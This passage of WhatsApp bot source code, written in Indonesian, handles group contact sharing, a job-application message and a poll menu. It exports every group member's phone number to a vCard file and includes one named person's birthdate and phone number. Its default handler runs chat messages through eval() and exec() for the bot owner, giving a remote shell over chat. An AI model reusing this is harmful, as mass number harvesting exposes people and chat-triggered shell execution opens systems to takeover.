            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${a.id.split('@')[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split('@')[0]}:+${a.id.split('@')[0]}\nEND:VCARD`
        }));

        // Mengirimkan kontak dalam format yang benar
        await sych.sendMessage(m.chat, {
            contacts: {
                displayName: "Kontak Grup",  // Nama kontak grup
                contacts: kontak  // Daftar kontak
            }
        });
    } catch (err) {
        console.error(err);
        return sych.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil kontak.' });
    }
}



break;


//lamaran
case 'm2': 
case 'selamat':
case 'siang':
case 'assalamualaikum':
{
			
		
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                   
                    
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `${n}Assalamualaikum bapak/ibuk${n}\n\nDengan hormat,\nSesuai dengan informasi yang didapatkan melalui dari teman membuka lowongan, maka saya yang bertanda tangan di bawah ini:\n\n> Nama: ${n}M GALANG FEBRIANSYAH PRATAMA${n}\n\n> Tempat, Tanggal Lahir: ${n}Palembang, 05 Februari 2003${n}\n\n> Pendidikan: ${n}SMK${n}\n\nBermaksud untuk mengajukan diri melamar pekerjaan pada lowongan tersebut.\n\nBersama dengan surat ini, saya juga melampirkan dokumen yang dibutuhkan sebagai bahan pertimbangan.\n\nBesar harapan saya untuk menghadiri panggilan tes dan wawancara untuk menjelaskan lebih mendalam mengenai data diri saya.\n\nAtas perhatian Bapak/Ibu, saya ucapkan terima kasih.\n\nHormat saya,\n\n${n}M Galang Febriansyah Pratama${n}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: '\n\nMy Profile Side ⤥'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: `${owname}`,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Website 🌐",
                                url: "https://www.galng.my.id/index1.html",
                                merchant_url: "https://www.google.com"
                            })
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Google Site Profile 🌐",
                                url: "https://www.google.com/search?q=m+galang+febriansyah+pratama&newwindow=1&client=ms-android-vivo-rvo2&sca_esv=99607a7fcd853d87&sxsrf=ADLYWIIFKxBzIxyYtGFAuXOqlpFBSN_RCw%3A1737603855705&ei=D7uRZ5XhKvev4-EPst_yoQk&oq=m&gs_lp=Egxnd3Mtd2l6LXNlcnAiAW0qAggAMgQQIxgnMgQQIxgnMgoQIxiABBgnGIoFMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEC4YgAQYsQMYgwEyDhAAGIAEGLEDGIMBGIoFMgsQABiABBixAxiDAUjeJ1DLDViKGnABeAKQAQOYAdgBoAHsF6oBBjAuMTkuMbgBAcgBAPgBAZgCA6ACgQKoAgrCAgQQABhHwgIHECMYJxjqAsICDRAuGNEDGMcBGCcY6gLCAgoQIxjwBRgnGOoCmAMk8QVe2Tv0u7ck7YgGAZAGCJIHAzIuMaAH1soB&sclient=gws-wiz-ser",
                                merchant_url: "https://www.google.com"
                            })
                        },
                        {
                            name: "cta_call",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Phone Number",
                                phone_number: "+6283833735020"
                            })
                        }
                        ],
                    }),
                    contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: false,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '1@newsletter',
                        newsletterName: 'M Galang Febriansyah Pratama',
                        serverMessageId: -1,
                    },
                    businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
                },
                })
            }
        }
    }, { quoted: fmemek });

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
//savecntk
case 'savecontact': case 'svcontact': {
     
    // Mengecek apakah pesan berada di grup dan apakah pengguna adalah admin atau creator
    if (!m.isGroup) return sych.sendMessage(m.chat, { text: mess.group });
    if (!(m.isAdmin || isCreator)) return sych.sendMessage(m.chat, { text: mess.owner });

    try {
        // Mendapatkan metadata grup dan peserta
        const groupMetadata = await sych.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        // Menyusun vCard untuk setiap peserta
        let vcard = '';
        participants.forEach((a, index) => {
            const phoneNumber = a.id.split('@')[0];
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[Langzx${index + 1}] +${phoneNumber}\nTEL;type=CELL;type=VOICE;waid=${phoneNumber}:${phoneNumber}\nEND:VCARD\n`;
        });

        // Menyimpan kontak ke dalam file vCard
        const fileName = './contacts.vcf';
        require('fs').writeFileSync(fileName, vcard.trim());

        // Memberikan notifikasi bahwa proses penyimpanan sedang berlangsung
        sych.sendMessage(m.chat, { text: `Menyimpan ${participants.length} kontak...` });

        // Mengirim file vCard ke grup
        await sych.sendMessage(m.chat, {
            document: require('fs').readFileSync(fileName),
            mimetype: 'text/vcard',
            fileName: 'Contact.vcf',
            caption: `Kontak berhasil disimpan.\nGrup: *${groupMetadata.subject}*\nTotal Kontak: *${participants.length}*`
        }, { ephemeralExpiration: 86400, quoted: fkontak });

        // Menghapus file setelah berhasil dikirim
        require('fs').unlinkSync(fileName);

    } catch (err) {
        // Menangani kesalahan yang terjadi selama proses
        console.error(err);
        return sych.sendMessage(m.chat, { text: 'Terjadi kesalahan saat menyimpan kontak.' });
    }
}
break;

case 'wi': 
case 'help': 
case 'list': 
case 'listmenu': {
    const title = "List Menu";
    const options = [
        'allmenuu',
        'MenuGroup'
        
    ];
    

    // Kirim polling ke chat
    sych.sendPoll(m.chat, title, options);
}
break;
		
		
			default: {
    if (autoAIStatus) {
        try {
            const hasil = await fetchJson(`https://api.siputzx.my.id/api/ai/llama?prompt=${encodeURIComponent(llamaPrompt)}&message=${encodeURIComponent(text)}`);
            if (hasil.status === true && hasil.data) {
                sycreply(hasil.data);
            } else {
                sycreply('Terjadi kesalahan saat mengambil data dari API!');
            }
        } catch (error) {
            sycreply('Terjadi kesalahan saat mengambil data dari API!');
            console.error('Error saat mengambil data dari API:', error);
        }
    }
				if (budy.startsWith('>')) {
					if (!isCreator) return
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await sycreply(evaled)
					} catch (err) {
						await sycreply(String(err))
					}
				}
				if (budy.startsWith('<')) {
					if (!isCreator) return
					try {
						let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await sycreply(evaled)
					} catch (err) {
						await sycreply(String(err))
					}
				}
				if (budy.startsWith('$')) {
					if (!isCreator) return
					if (!text) return
					exec(budy.slice(2), (err, stdout) => {
						if (err) return sycreply(`${err}`)
						if (stdout) return sycreply(stdout)
					})
				}
			}
			if (autoAi && text) { // Cek apakah autoAi aktif dan ada input teks
            try {
                let prompt = `${userPrompt}: ${text}`; // Gunakan prompt yang sudah disetel
                let hasil = await yanzGpt(prompt);
                sycreply(hasil.choices[0].message.content);
            } catch (e) {
                try {
                    let prompt = `${userPrompt}: ${text}`;
                    let hasil = await bk9Ai(prompt);
                    sycreply(hasil.BK9);
                } catch (e) {
                    sycreply(pickRandom([
                        'Fitur Ai sedang bermasalah!',
                        'Tidak dapat terhubung ke ai!',
                        'Sistem Ai sedang sibuk sekarang!',
                        'Fitur sedang tidak dapat digunakan!'
                    ]));
                }
            }
        }
        break;
    }
    
    
	} catch (err) {
		console.log(util.format(err));
		//sycreply('*❗ Internal server error️*');
		sych.sendFromOwner(owner, 'Halo sayang, sepertinya ada yang error nih, jangan lupa diperbaiki ya\n\n*Log error:*\n\n' + util.format(err), m, {
			contextInfo: {
				isForwarded: true
			}
		})
	}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
